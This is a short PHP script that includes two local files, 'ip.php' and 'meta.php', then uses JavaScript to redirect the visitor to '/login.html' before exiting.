<?php
include 'ip.php';
include 'meta.php';
echo "<script>window.location.replace('/login.html');</script>";
exit();
?>
